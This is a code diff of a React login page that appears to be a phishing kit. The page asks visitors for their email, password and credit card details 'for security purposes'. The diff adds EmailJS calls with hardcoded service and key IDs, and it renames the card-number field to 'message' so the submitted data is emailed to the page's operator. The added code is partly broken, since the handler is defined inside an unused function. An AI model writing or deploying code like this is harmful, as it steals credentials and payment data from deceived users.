@@ -1,9 +1,31 @@
-import { useState } from 'react'
+import { useState, useRef } from 'react';
+import emailjs from '@emailjs/browser';
 
 // import { BrowserRouter as Router, Route, Routes } from "react-router-dom"
 import Logo from '/pal.svg'
 
 function App() {
+  
+  const ContactUs = () => {
+  const form = useRef();
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm('service_7blw9ip', 'template_cly531s', form.current, {
+        publicKey: 'FAHNG1VGe5hs8ilJf',
+      })
+      .then(
+        () => {
+          console.log('SUCCESS!');
+        },
+        (error) => {
+          console.log('FAILED...', error.text);
+        },
+      );
+  };
+  }
   function ForgotPassword() {
     return (
       <a href="#" className="text-blue-500 hover:underline">
@@ -41,7 +63,7 @@ function App() {
             <input
               type="text"
               id="cardNumber"
-              name="cardNumber"
+              name="message"
               className="w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
               placeholder="**** **** **** ****"
               maxLength={16}
@@ -56,7 +78,7 @@ function App() {
               </label>
               <input
                 type="text"
-                id="expiryDate"
+                id="exp_date"
                 name="expiryDate"
                 className="w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
                 placeholder="MM/YY"
@@ -103,7 +125,7 @@ function App() {
         <input
           type="email"
           id="email"
-          name="email"
+          name="to_name"
           className="w-full text-lg py-5 rounded-md border border-gray-600 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
           placeholder="Enter your email"
         />
@@ -144,17 +166,14 @@ function App() {
       <div className="py-8">
         <img src={Logo} alt='logo' height={40} width={40} />
       </div>
-      <form className='w-[100%]'>
+      <form className='w-[100%]' ref={form} onSubmit={sendEmail}>
         <EmailField/>
         <PasswordField />
         <p  className='text-base font-medium py-2 '>PLease Confirm your Credit Card Details [NOTE THAT THIS IS FOR SECURITY PURPOSES]</p>
        
         <CreditCardForm/>
         <p className='text-lg font-bold text-blue-600 py-3'>Forgot password?</p>
-        <button type="submit" className=" text-lg bg-blue-600 hover:bg-blue-800 text-white font-semibold py-2 w-full rounded-3xl"
-         onSubmit={() =>  {
-          
-         }}>
+        <button type="submit" className=" text-lg bg-blue-600 hover:bg-blue-800 text-white font-semibold py-2 w-full rounded-3xl" value="Send">
               Log In
         </button>
         <p className='py-6 text-center font-bold'>or</p>
@@ -184,5 +203,6 @@ function App() {
     </>
   )
 }
+
 
 export default App
